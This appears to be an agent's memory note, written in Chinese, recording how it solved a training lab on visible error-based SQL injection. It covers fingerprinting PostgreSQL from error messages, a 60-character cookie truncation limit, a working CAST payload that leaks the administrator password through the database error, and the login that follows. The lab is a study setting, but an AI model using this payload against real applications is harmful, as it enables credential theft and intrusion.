---
metadata:
  node_type: memory
name: "PRS arm A lab-sql-injection-visible-error-based"
description: "arm A 基线:lab-sql-injection-visible-error-based 冷实例一次通过 - CAST 错误回显泄 administrator 口令(值 60 字符截断为关键坑)"
last_updated: 2026-10-09T06:29:23+08:00
created: 2026-10-09T06:29:23+08:00
---

## 2026-10-09 arm A

题:lab-sql-injection-visible-error-based (canonical 路径直接 launch-url)。终态:一次通过 congrats。

- 实例:launch-url 直取,reused:false;jar /tmp/cj1.json 已带 TrackingId=59fCzeR2Gglz4tt5。
- 注入点 = TrackingId cookie;后端 SQL 为 `SELECT * FROM tracking WHERE id = '<value>'`,错误原文回显在页面 h4/p。
- DBMS 判定(一次矩阵四条):`'` → 500 `Unterminated string literal started at position N`;`CAST('zzz' AS int)` → `ERROR: invalid input syntax for type integer: "zzz"`(PostgreSQL);`extractvalue` → `function ... does not exist`;注释 `--` 有效,`#` 无效,`/*` 报 unterminated block comment。
- 铁律:TrackingId 值被截断到 60 字符(60 字符含尾引号生效,62 字符丢引号回 200 基线 digest)。载荷必须 ≤60,否则静默截断成"语法正常"的假阴性。
- 泄漏载荷(58 字符,`LIMIT 1` 首行即 administrator):`' AND 1=CAST((SELECT password FROM users LIMIT 1)AS int)--` → 明文口令 pbnwako3ze8cuxecvcm7;同形换 `username` 得 `administrator`。
- 收口:GET /login 取 csrf → POST /login(administrator + 口令)→ 302 /my-account?id=administrator → banner_verdict solved:true。登录后页面当次仍渲染 is-notsolved,须再取一次首页才翻牌。
- 件面:raw_matrix(--values 未用,variants 逐条;headers 里勿再写 Host,否则前端回 `Duplicate header names are not allowed`)→ http_session → banner_verdict,全程无 python/bash。

